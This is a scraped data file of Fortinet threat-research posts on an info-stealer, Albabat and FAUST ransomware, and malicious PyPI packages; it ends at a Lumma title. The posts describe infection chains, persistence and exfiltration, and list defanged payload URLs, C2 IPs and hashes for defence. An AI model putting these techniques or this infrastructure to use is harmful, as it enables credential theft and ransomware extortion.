count, and cookie count. Furthermore, a watermark in the message sent to the bot links to a telegram channel that provides hacking tools and sensitive information. Though it is not directly relevant to this campaign group, it still gives a fresh example of how stolen information is spread. As we mentioned, many stages of this attack are downloaded from an open platform. This gives us a chance to gather more information about this hacker group. Apart from the files in the infection vectors, files sharing several commonalities with this campaign were also uploaded. For example, obfuscated batch files and VBScript files executing PowerShell code whose code is identical to Windows Update.bat and test.vbs. From those downloaders, we found more repositories related to this hacker group. In addition, there is malware probably used in other campaigns loaded on the repositories, including XWorm, VenomRat, RedLine, etc. We also found clues to another campaign from the telegram bot that receives the victim’s information. As Figure 10 shows, the threat actor cheated the victim into enabling macros in a Word document named “done 300coki.docm.” Though we couldn’t obtain the file named in Figure 10, the file name dropped a hint that they used cookies as a lure. Moreover, we found another Word document containing Facebook cookies and a malicious macro in the chat history. Like the Excel document we mentioned previously, the macro downloads an obfuscated batch file, which downloads the next stage of the attack. However, the infection vector was divided into more pieces, as Figure 12 shows. The dll files are extracted from image files. The data is base64-encoded and appended to a jpg file. The payload is XWorm, which we also found variants of on the GitHub repositories mentioned in the Abused Open Platforms section. The threat actors separate the malware campaign into several simple downloaders and use open platforms to avoid detection. However, this also provided clues to identify the hacker group. From the information left in the files, we also found files abused in other campaigns and the SNS platforms being abused to distribute malware. Such services not only provide a convenient environment for people but are commonly used by threat actors. The malware described in this report are detected and blocked byFortiGuard Antivirusas: VBA/Agent.ZCI!trMSIL/Injector.UWS!trVBA/Agent.4C99!tr.dldrVBS/Agent.HLI!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. TheFortiGuard CDR(content disarm and reconstruction) service can disarm the malicious macros in the document. We also suggest that organizations go through Fortinet’s freeFortinet Certified Fundamentals (FCF)in cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. FortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact our GlobalFortiGuard Incident Response Team. gitlab[.]com/anhducratsilvergithub[.]com/Akabanwa-tomagithub[.]com/osmosieucapvipprogithub[.]com/NHTBOTgithub[.]com/1nuhongio 65[.]0[.]50[.]125103[.]85[.]247[.]6174[.]222[.]9[.]95103[.]82[.]26[.]41103[.]48[.]85[.]6 d897376e35ace588d386b9fff1ba65277172571f5d0af90f371413380996e1e470e77806d5bec502c66ef9c3ce9d0cc9294f965b15a33cf8b180749171d5b710eb64896197045b6897a141781171294d20e09a7172d8de978da09b958b2bc1d4e428edefeffb76e649961f9b25df39fdcc5c0b52b29775c012bb58d47ef88beb736f49f37da9a93ef79178344e46ea9fe98dbbf1bb8d2b06da232b0dd7fc4a4cb83c0c12fcc7b81b423cc30e9ec192ee913b309db30980442203121f6e69cfd009b9251e1b459b632dedeb23a0ce985b261b30ac8938036dbb4c93ea1ef8199be78bd2a56e5e7b1c5305724bb171c69df21b6a5fef83ccd89e88d16bb1be79b9b33b10a686db213ca3253f55133a15e83262f6fc45506b425e46f972dfadb39eacbed913a5e14c724293bb48af87ca012202ae8c7c3b2df1b4aa077924414efbd36af2c9097b9c718e035d345ad20c38c3ce66b63827d2c2b24cc3235b6eb70952575032c7eb4b3816b0e8a57ee4ea1cf19aacb32c3e2f96b8a891fe4ba2bcac python,excel FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/python-info-stealer-malicious-excel-document"
  },
  {
    "title": "Ransomware Roundup - Albabat",
    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the Albabat ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts victims' files and demands ransom for file decryptionSeverity level:High Albabat, also known as White Bat, is a financially motivated ransomware variant written in Rust that identifies and encrypts files important to the user and demands a ransom to release them. It first appeared in November 2023 with the variant Version 0.1.0. Version 0.3.0 was released in late December, followed by version 0.3.3 in mid-January 2024. The Albabat ransomware appears to be distributed as rogue software, such as a fake Windows 10 digital activation tool and a cheat program for the Counter-Strike 2 game. The Albabat ransomware samples were submitted to a publicly available file scanning service, and it appears to be primarily targeting companies and individuals in Argentina, Brazil, the Czech Republic, Germany, Hungary, Kazakhstan, Russia, and the United States. But because it is being distributed as fake software, the ransomware can affect anyone. Once the Albabat ransomware is executed, it looks for files to encrypt. It avoids encrypting the following file types: N2PK abbt arc arz bik bin bk2 cab cat cur dat desktop dll inf ini lib lnk log mp2 msi nfo otf pdb pkg pkr pyd qt resource sfx sig so swf tcl tmp ttf url vc vdf vfont vpk whl win wma woff woff2 xnb Additional file types listed below are excluded from encryption in versions 0.3.0 and 0.3.3: CHK _pth cmd com icls ico idx mod mp3 ogg pickle src theme vhdx vscdb ~$ dic lock mui pyc smc srm Note that the file types highlighted in light green are excluded in version 0.3.0. The file types highlighted in light yellow are additional files excluded in version 0.3.3. Files encrypted by the Albabat ransomware are given a “.abbt” file extension. The ransomware also replaces the desktop wallpaper with its own. The Albabat ransomware’s wallpaper claims it supports Windows and Linux platforms. However, we have not been able to locate Linux samples. Since the ransomware is written in the Rust language, which can be cross-compiled from one operating system to another, it's possible that a Linux version will be released in the future. Version 0.1.0 tries to terminate Chrome.exe. Starting with version 0.3.0, the ransomware also attempts to terminate the following additional processes: taskmgr.exe code.exe excel.exe powerpnt.exe winword.exe msaccess.exe mspub.exe chrome.exe cs2.exe (the game Counter Strike 2) steam.exe onedrive.exe postgres.exe mysqlworkbench.exe outlook.exe windowsterminal.exe sublime_text.exe Version 0.3.0 and later also stops the following services: MySQL57 MySQL80 MySQL82 postgresql-x64-14 postgresql-x64-15 Starting with version 0.3.0, the ransomware may steal from or modify the following files: AppData\\Roaming\\Electrum\\wallets AppData\\Roaming\\JetBrains AppData\\Local\\Microsoft\\OneDrive C:\\Program Files (x86)\\Steam\\steamapps\\common\\Counter-Strike Global Offensive\\game\\csgo\\cfg D:\\Games\\steamapps\\common\\Counter-Strike Global Offensive\\game\\csgo\\cfg D:\\Steam\\steamapps\\common\\Counter-Strike Global Offensive\\game\\csgo\\cfg Version 0.3.3 adds the following entries to the Windows Hosts file to block access to certain sites: Once the encryption process is finished, the ransomware drops the following files: Version 0.1.0 Version 0.3.0 Version 0.3.3 The README.html file is a ransom note instructing victims to email the attacker. It demands 0.0015 Bitcoin (approximately $64 US) for file decryption. The ransom notes dropped by versions 0.1.0, 0.3.0, and 0.3.3 are significantly different except for the format. The ransom note has a translation option that uses the Google Translate service, allowing it to be translated into over 100 languages. When the translation option is selected, Portuguese is automatically selected as the translation language, which may indicate that this is the primary language of the ransomware developer. Files larger than 5MB were not encrypted in our test environments, as per the ransom note. The FAQ option opens FAQ.html, which does not differ much between variants except for item 10, which was added in version 0.3.0. The attacker’s Bitcoin wallet had no transactions at the time of our investigation. Although one of the Albabat ransomware samples instructs victims to visit a TOR site, the site was no longer accessible at the time of our investigation. Since there is no mention of data exfiltration in the ransom notes, it is likely that the TOR site was only used for ransom negotiations. Fortinet customers are already protected from this malware variant through our AntiVirus and FortiEDR services, as follows: FortiGuard Labs detects the Albabat ransomware samples with the following AV signatures: TheFortiGuard AntiVirus serviceis supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. Albabat Ransomware File IOCs SHA2 e1c399c29b9379f9d1d3f17822d4496fce8a5123f57b33f00150f287740049e9 ce5c3ec17ce277b50771d0604f562fd491582a5a8b05bb35089fe466c67eef54 483e0e32d3be3d2e585463aa7475c8b8ce254900bacfb9a546a5318fff024b74 614a7f4e0044ed93208cbd4a5ab6916695e92ace392bc352415b24fe5b2d535c bfb8247e97f5fd8f9d3ee33832fe29f934a09f91266f01a5fed27a3cc96f8fbb Due to the ease of disruption, damage to daily operations, potential impact on an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREEFortinet Certified Fundamentals (FCF)in Cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. FortiReconis a SaaS based Digital Risk Prevention Service backed by cybersecurity experts to provide unrivaled threat intelligence on the latest threat actor activity across the dark web, providing a rich understanding of threat actors’ motivations and TTPs. The service can detect evidence of attacks in progress allowing customers to rapidly respond to and shut down active threats. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Additionally,FortiRecon Digital Risk Protection (DRP)is a SaaS-based service that provides a view of what adversaries are seeing, doing, and planning to help you counter attacks at the reconnaissance phase and significantly reduce the risk, time, and cost of later-stage threat mitigation. Ransomware Roundup FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-albabat"
  },
  {
    "title": "Another Phobos Ransomware Variant Launches Attack – FAUST",
    "content": "FortiGuard Labs Threat Research The Phobos ransomware family is a notorious group of malicious software designed to encrypt files on a victim's computer. It emerged in 2019 and has since been involved in numerous cyber attacks. This ransomware typically appends encrypted files with a unique extension and demands a ransom payment in cryptocurrency for the decryption key. FortiGuard Labs has captured and reported on several ransomware variants from the Phobos family, includingEKINGand8Base. Recently, FortiGuard Labs uncovered an Office document containing a VBA script aimed at propagating the FAUST ransomware, another variant of Phobos. The attackers utilized the Gitea service to store several files encoded in Base64, each carrying a malicious binary. When these files are injected into a system's memory, they initiate a file encryption attack. Figure 1 shows the attack chain. In this blog, we explore the different phases of file deployment and delve into the details of the delivered malware. The XLAM document we discovered contains an embedded VBA script, as illustrated in Figure 2. Upon opening the document, the script triggers PowerShell for the next stage using the “Workbook_Open()” function. It then downloads Base64-encoded data from Gitea, which can be decoded into a clean XLSX file. This file is then saved in the TEMP folder and automatically opened, misleading users into thinking the process is completed and poses no harm. Figure 3 displays the decoded code retrieved from the variable “SkSLjvNc.” The PowerShell script downloads data from hxxps://gitea[.]com/JoinPokingo/JingaPol/raw/branch/main/cfmifs_CRPT[.]txt, extracts the targeted malicious section in “cfmifs_CRPT[.]txt” using the pattern “DICK{(.*)}DICK” and decodes the result from Base64, which is shown in Figure 4. Lastly, a random folder is selected within “$env:APPDATA..\\Local,” and two randomly generated characters are appended to the folder name, giving it a new name. The executable, “AVG update.exe,” is saved in this new folder, as shown in Figure 5. The executable file “AVG update.exe” functions as a downloader. It incorporates an abundance of extraneous code to evade detection and complicate analysis. Employing a process injection technique, it allocates Read-Write-Execute (RWE) memory to inject the malicious code into a newly generated process. Additionally, the file encodes all its strings and XORs them with specific hexadecimal keys before utilization. Figure 6 shows the assembly code for obtaining a DLL name from the encoded string “blogaudit” utilizing XOR hex keys. “blogauditblo” ^ 0x29293d292439575B5A262023 = “KERNEL32.DLL” It encompasses the following functions: The attacker allocates a section within the target process's memory, inserts malicious code, and calls to the payload's entry point. FAUST Ransomware is a variant of the Phobos family, a type of malware that encrypts the files on the victim's computer. It demands a ransom in exchange for providing a decryption key. This ransomware appends the \".faust\" extension to each encrypted file and generates info.txt and info.hta within the directories housing the encrypted files. These files serve as a means to establish contact with the attackers for ransom negotiations. It checks the Mutex object to ensure only one process is running, and it adds persistence by adding a registry to “HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run “ and copying itself to two folders: “%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup and “C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup.” These folders are associated with the Windows startup configuration. The former is user-specific, launching programs at user login, while the latter is system-wide, affecting all users during system startup. They are crucial for automatically running the FAUST Ransomware. To avoid destroying the system, double-encrypting files, or encrypting its ransom information, it contains an exclusion list: Like the typical behavior of Phobos variants, FAUST ransomware keeps the decryption function for configuration. Take the exclusion list, for example. It uses the index 7 for file extensions, 8 for filenames, and 9 for directories. It also initiates multiple threads to perform various tasks. These tasks include deploying encryption, scanning logical drives, searching for network/sharing resources, scanning files individually, and explicitly seeking database-related files (such as fdb, sql, 4dd, 4dl, abs, abx, accdb, accdc, accde, adb, adf, ckp, db, db-journal, db-shm, db-wal, db2, db3, dbc, dbf, dbs, dbt, dbv, dcb, dp1, eco, edb, epim, fcd, gdb, mdb, mdf, ldf, myd, ndf, nwdb, nyf, sqlitedb, sqlite3, and sqlite). The encrypted files carry the extension “.id[<<ID>>-3512].[babylon4367@proton.me].faust.” It also launches the HTML version of the ransom note, “info.hta,” on the victim’s device. Figure 13 shows the message instructing victims to contact the attackers via email, using the specific ID as the message's title, or through a TOX message. By inspecting the TOX ID, we found that the original seller initiated the selling process in November 2023, as shown in Figure 14. Notably, the selling activity is ongoing, and users should remain vigilant against this ongoing threat. This report delved into the FAUST variant of the Phobos ransomware, providing insights into the process of downloading the payload file from an MS Excel document embedded with VBA script. Our analysis uncovered a threat actor employing a fileless attack to deploy shellcode, injecting the final FAUST payload into the victim's system. The FAUST variant exhibits the ability to maintain persistence in an environment and creates multiple threads for efficient execution. To safeguard devices from potential malware threats, users must exercise caution and refrain from opening document files from untrusted sources. The malware described in this report are detected and blocked byFortiGuard Antivirusas: VBA/Dropper.CB!trW64/Agent.ACFT!trW64/Agent.A9D5!trW64/Dloader.584B!trW32/FilecoderPhobos.C!tr.ransom FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. The FortiGuard CDR (content disarm and reconstruction) service can disarm the malicious macros within the document. We also suggest that organizations go through the freeFortinet Certified Fundamentals (FCF)in Cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. Fortinet also provides an extensive portfolio of services powered by our global FortiGuard team of seasoned cybersecurity experts. The FortiGuard IP Reputation and Anti-Botnet Security Services proactively block attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. FortiRecon, a SaaS-based Digital Risk Prevention Service backed by cybersecurity experts, provides unrivaled threat intelligence on the latest threat actor activity across the dark web, providing a rich understanding of threat actors’ motivations and TTPs. The service can detect evidence of attacks in progress, allowing customers to rapidly respond to and shut down active threats. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. Files: 426284b7dedb929129687303f1bf7e4def607f404c93f7736d17241e43f0ab3350e2cb600471fc38c4245d596f92f5444e7e17cd21dd794ba7d547e0f2d9a9d5a0a59d83fa8631d0b9de2f477350faa89499e96fd5ec07069e30992aaabe913aebe77c060f8155e01703cfc898685f548b6da12379e6aefb996dbcaac201587cc10dc2f6694414b68c10139195d7db2bb655f3afdcc1ac6885ef41ef1f0078df ransomware attack,Cara Lin FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/phobos-ransomware-variant-launches-attack-faust"
  },
  {
    "title": "Info Stealing Packages Hidden in PyPI",
    "content": "FortiGuard Labs Threat Research Affected platforms:All platforms where PyPI packages can be installedImpacted parties:Any individuals or institutions that have these malicious packages installedImpact:Leak of credentials, sensitive information, etc.Severity level:High The Python Package Index (PyPI) is an open repository of software packages developed by the Python community to help people quickly develop or update applications. While most of the packages uploaded to PyPI are posted by dedicated individuals looking to support the Python community, threat actors also regularly post packages infected with malware. The FortiGuard Labs team uses a proprietary, AI-driven OSS malware detection system to hunt for and monitor these threats. Recently, we identified a PyPI malware author (who goes by the ID “WS”) discreetly uploading malicious packages to PyPI. We now estimate that there may be well over 2000 victims of “WS” just from the packages described below alone. The identified packages—nigpal, figflix, telerer, seGMM, fbdebug, sGMM, myGens, NewGends, and TestLibs111—exhibit attack methodologies similar to those outlined in a Checkmarxblog postpublished four months ago. The similarity suggests a possible connection to a malicious campaign from early 2023. Notably, these packages incorporate base64-encoded source code of PE or other Python scripts within their setup.py files. Depending on the victim devices’ operating system, the final malicious payload is dropped and executed when these Python packages are installed. A brief timeline of our findings about this info-stealing author is detailed below. The packages released before December 2023 are very similar to those discussed in earlier blog posts. Specifically, they deploy Whitesnake PE malware if the victim’s device runs on Windows, or they can deliver a Python script designed to steal information from Linux devices. A subtle distinction lies in the new method now being used by the Python script to transmit stolen data. Instead of relying on a single fixed URL, these new malware variants use a range of IP addresses as the destination, likely to ensure successful data transmission even if one server fails. Given the strong resemblance of these new packages to the previous ones, we will focus on analyzing the payloads from these more recent variants. Unlike earlier attacks that targeted both Windows and Linux users, this recent set of packages predominantly targets Windows users. While the executable payload for each package varies slightly from one another, they consistently aim to exfiltrate sensitive information from victims. Let’s take a brief look at a few of these payloads. Unlike the previous Whitesnake PE payloads developed using .NET, this sample manifests as a Python-compiled executable crafted using the PyInstaller tool. Upon careful examination of its contents post-extraction, the primary script file is revealed as 'main.pyc' accompanied by an 'addresses.py' counterpart. The mere presence of this counterpart raises suspicions. Upon decompiling 'main.pyc,' we can see that the code is somewhat incomplete, accentuating its clandestine nature. Red flags include copying itself to the Windows startup folder for autorun on startup. The script also probes logical drives, endeavoring to copy itself into non-removable drives. Notably, it adopts a discreet strategy by monitoring the count of its running instances, ensuring an inconspicuous profile complete with an exit strategy if the count surpasses two. Finally, the script retrieves the clipboard contents and compares them against predefined cryptocurrency address patterns. The discovery of matching patterns prompts the script to overwrite the clipboard with corresponding addresses sourced from 'addresses.py.' This could deceive unsuspecting victims into directing things like cryptocurrency transactions to an unexpected destination. This payload is an encrypted .NET executable. Upon being installed on the user’s device, the payload launches an invisible window of “cmd.exe.” It then uses \"powershell.exe\" through this window to add itself to the Windows Defender’s exclusion list to bypass the built-in security response: It then copies itself to the Windows Application folder and creates a scheduled task to run itself every hour once the device is infected: Each time the task runs, it establishes a connection to the malicious IP: 194[.]36[.]177[.]30. It uses “socket.io” to connect the server to the client. This way, if the connection is lost, it will automatically try to reconnect. The core of this payload tries to collect user information, such as the user’s IP address, the host credentials, etc.: The following strings offer more compelling evidence of the information-stealing capabilities of this payload. They reveal that the payload not only captures mouse and keyboard interactions but also acquires and transmits wallet and browser data to the remote server. Once this sample runs, we can observe data being sent to a suspicious IP address (194[.]36[.]177[.]30), as shown in Figure 12. At first glance, we might dismiss these as inconspicuous strings. However, further investigation shows this to be a .zip file shrouded in multiple layers of encryption. This raises serious concerns about its behavior. Upon decryption, we see 'PK' as the initial bytes, indicating a .zip file format. After debugging this sample, there are several indicators as to what sensitive content it may be interested in. Below are a few of the many interesting strings that were found during our analysis. Some of these strings may indicate info-stealing from different services, such as browsers, applications, and cryptocurrency services. Some examples we found included Chrome, Discord, Filezilla, and Coinbase. When we extract the .zip file, we can see some of the collected content. The author then exfiltrates this sensitive information to the server. This blog demonstrates the ability of a single malware author to disseminate numerous info-stealing malware packages into the PyPI library over time, each featuring distinct payload intricacies. Users are urged to exercise utmost caution when using open-source packages, checking for malicious content or payloads that may render targeted devices susceptible to information theft. The narrative of this particular malware author has unfolded over several months and showcases the considerable amount of havoc that has been wrought. Information-stealing malware is an increasingly pertinent and pressing subject. Safeguarding against such persistent adversaries demands a strategic and forward-thinking approach to fortify your defenses. FortiGuard AntiVirusdetects the malicious files identified in this report as nigpal-0.1 setup.py: PYTHON/Agent.c51b!trnigpal payload: (PE) MSIL/WhiteSnake.C!trnigpal payload: (Python) PYTHON/Agent.7f73!trfigflix-0.1 setup.py: PYTHON/Agent.c51b!trfigflix-0.2 setup.py: PYTHON/Agent.c51b!trfigflix payload: (PE) MSIL/WhiteSnake.C!trfigflix payload: (Python) PYTHON/Agent.7f73!trtelerer-2.0 setup.py: PYTHON/Agent.c51b!trtelerer-2.1 setup.py: PYTHON/Agent.c51b!trtelerer-2.2 setup.py: PYTHON/Agent.c51b!trtelerer-2.3 setup.py: PYTHON/Agent.c51b!trtelerer payload: W32/Kryptik.HTVT!trseGMM-1.3.1 setup.py: PYTHON/Agent.c51b!trseGMM-3.1.1 setup.py: PYTHON/Agent.c51b!trseGMM payload: W32/Kryptik.HTVT!trfbdebug-0.1 setup.py: PYTHON/Agent.c51b!trfbdebug payload (PE): MSIL/WhiteSnake.C!trfbdebug payload (Python): PYTHON/Agent.7f73!trsGMM-1.3.2 setup.py: PYTHON/Agent.c51b!trsGMM payload: W32/ClipBanker.DE!trmyGens-1.3 setup.py: PYTHON/Agent.c51b!trmyGens-1.3 payload: MSIL/Agent.ERW!tr.spyNewGends-1.3 setup.py: PYTHON/Agent.c51b!trNewGends-1.3 payload: MSIL/Agent.ERW!tr.spyTestLibs111-1.4 setup.py: PYTHON/Agent.c51b!trTestLibs111-1.5 setup.py: PYTHON/Agent.c51b!trTestLibs111-1.7 setup.py: PYTHON/Agent.c51b!trTestLibs111 payload: W32/Agent.ORR!tr.pws The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Customers running current AntiVirus updates are protected. TheFortiGuard Web FilteringService detects and blocks the download URLs cited in this report as Malicious. TheFortiDevSecSCA scanner detects malicious packages, including those cited in this report that may operate as dependencies in users' projects in test phases, and prevents those dependencies from being introduced into users' products. If you believe these or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. File Hash (sha256) Detection nigpal-0.1 setup.py c53d1387864ea3034bc4e19af492b3e67147d3fdc1d8b9752e24600d6919e3af PYTHON/Agent.c51b!tr nigpal payload (PE) ab75ea75d1fe5bc51ecef274a95f7b835b09a0c7c95c4227366a3d64b5dee7c0 MSIL/WhiteSnake.C!tr nigpal payload (Python) 24e07dd8c4a6fb92d842ebc168a40505bbd0421a16c13a06571910ca7a40a5a5 PYTHON/Agent.7f73!tr figflix-0.1 setup.py 41ff3fedb78c672c6d0e5e849f81c8be10c0767558fcfdf6f529215556354d9e PYTHON/Agent.c51b!tr figflix-0.2 setup.py 377e8ca04aed57a10b350d9eb4a6e64818bb69b790f33db4be0fd22589c435ad PYTHON/Agent.c51b!tr figflix payload (PE) 34e5bd67fbd9a7040dca9cae90e36013aaeda1940bb39e7fcd5d5fa9c85cadc8 MSIL/WhiteSnake.C!tr figflix payload (Python) b2bf755c4e1336f5ab36bc679d4a86e4c0d4da7b33a26b9ec8c01e179027f66b PYTHON/Agent.7f73!tr telerer-2.0 setup.py 3dcff80475ebfb9a3aa93f3cebd8f008ea64d857a7c53719f1ca047dfd050e1c PYTHON/Agent.c51b!tr telerer-2.1 setup.py dc5b74c1007bbe9acce3cddf30870766867b40e7d37264b7bdaf3b5f40747c10 PYTHON/Agent.c51b!tr telerer-2.2 setup.py f1f6501a97b9145d8dd755d25a39c1803fe54995a39fd59b2914f591d56bdc68 PYTHON/Agent.c51b!tr telerer-2.3 setup.py 8bdc674e3a41370a2d0a997b6ca673c6d646ed580400af242980a5ec374864a2 PYTHON/Agent.c51b!tr telerer payload 4fac457f8170e26643d0a4d8a0199e93d72872e1799e95f5c522a50754982079 W32/Kryptik.HTVT!tr seGMM-1.3.1 setup.py ef0e1a8378d1dd9e3cfd0d59d1969b618e15ddb4bbfaf50057670842004346e8 PYTHON/Agent.c51b!tr seGMM-3.1.1 setup.py 6fe87ab0590229d11f2d174bcf13cfbaca6f6c9dc55af84527c96de16c12c799 PYTHON/Agent.c51b!tr seGMM payload 4fac457f8170e26643d0a4d8a0199e93d72872e1799e95f5c522a50754982079 W32/Kryptik.HTVT!tr fbdebug-0.1 setup.py da0c21c66fd0dc42b1bcb06c9bd0d7e48b1b866720229712df64410eebd62199 PYTHON/Agent.c51b!tr fbdebug payload (PE) d9568da21005794d80eb6572ccce47cc766ba5fe24b2b82cd4ff2cf05d8531a2 MSIL/WhiteSnake.C!tr fbdebug payload (Python) ec9e1342b0bddbd0ef65cd37a751b3a8c3c8170cdd8cce0f0fb6815b6be26a45 PYTHON/Agent.7f73!tr sGMM-1.3.2 setup.py 8fb72c3a6a5d96f91c3dc46541331ebf0a6cf326d2353ab6f2b1c119e9907670 PYTHON/Agent.c51b!tr sGMM payload 94be6da31c5f896017af733a44b9ea00abbb35bce0a8dbcab776367234e4d818 W32/ClipBanker.DE!tr myGens-1.0 setup.py f22110ea2376082651f5f0724875e6f9d083e2be0688dc06b59206c35fa50def PYTHON/Agent.c51b!tr myGens payload 03a1621af484ff8f5c1797b25426bab656b6731dba43e31fe58fc1f1963d8484 MSIL/Agent.ERW!tr.spy NewGends-1.3 setup.py 857bc70fb5968b9f5e257e41f4be9cdd8c7135314bf6200e2cf5b60186401e7a PYTHON/Agent.c51b!tr NewGends payload 03a1621af484ff8f5c1797b25426bab656b6731dba43e31fe58fc1f1963d8484 MSIL/Agent.ERW!tr.spy TestLibs111-1.4 setup.py c9e0b8c6c5140acae2b3bf003d9ae2a69abf04253b0bd932ec97c732a4b9bf97 PYTHON/Agent.c51b!tr TestLibs111-1.5 setup.py 0e13bb49aba0878b919bc0980ce2e9e3cfa876387fcedf5af41235ab0f7a440a PYTHON/Agent.c51b!tr TestLibs111-1.7 setup.py 14cd40cce030bfca6a4c06fdadd353b5eaa092e7f73ba65308afedc04270c9b9 PYTHON/Agent.c51b!tr TestLibs111 payload 2b617277fc551b7500867ee009a0f80cbe6d5ee729bdfbf9b4f9d52164811082 W32/Agent.ORR!tr.pws 194[.]36[.]177[.]30 95[.]140[.]147[.]126[:]8080 78[.]46[.]66[.]9[:]8080 116[.]203[.]194[.]247[:]8080 206[.]189[.]109[.]146[:]80 217[.]145[.]238[.]175[:]80 164[.]90[.]185[.]9[:]443 185[.]216[.]26[.]127[:]8080 94[.]156[.]6[.]209[:]80 185[.]217[.]98[.]121[:]443 185[.]217[.]98[.]121[:]80 192[.]99[.]44[.]107[:]8080 52[.]86[.]18[.]77[:]8080 18[.]218[.]18[.]183[:]80 192[.]99[.]196[.]191[:]443 216[.]250[.]190[.]139[:]80 24[.]199[.]110[.]250[:]8080 35[.]166[.]49[.]216[:]8080 5[.]78[.]68[.]6[:]8009 44[.]228[.]161[.]50[:]443 162[.]33[.]178[.]113[:]80 103[.]226[.]125[.]218[:]80 106[.]15[.]66[.]6[:]8080 121[.]63[.]250[.]132[:]88 18[.]228[.]80[.]130[:]80 65[.]20[.]76[.]112[:]80 47[.]96[.]78[.]224[:]8080 216[.]39[.]242[.]18[:]8080 129[.]151[.]109[.]160[:]8080 168[.]138[.]211[.]88[:]8099 139[.]99[.]123[.]53[:]9191 54[.]92[.]18[.]154[:]443 135[.]181[.]98[.]45[:]8888 65[.]108[.]226[.]108[:]8080 45[.]155[.]171[.]134[:]8080 141[.]94[.]175[.]31[:]8098 116[.]202[.]101[.]219[:]8080 129[.]159[.]134[.]19[:]8080 107[.]161[.]20[.]142[:]8080 3[.]142[.]76[.]113[:]80 104[.]184[.]140[.]41[:]9000 205[.]185[.]123[.]66[:]8080 154[.]31[.]165[.]232[:]80 139[.]84[.]231[.]199[:]8080 103[.]244[.]151[.]46[:]8080 52[.]196[.]241[.]27[:]443 13[.]112[.]250[.]213[:]443 189[.]115[.]63[.]77[:]8080 FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/info-stealing-packages-hidden-in-pypi"
  },
  {
    "title": "Deceptive Cracked Software Spreads Lumma Variant on YouTube",
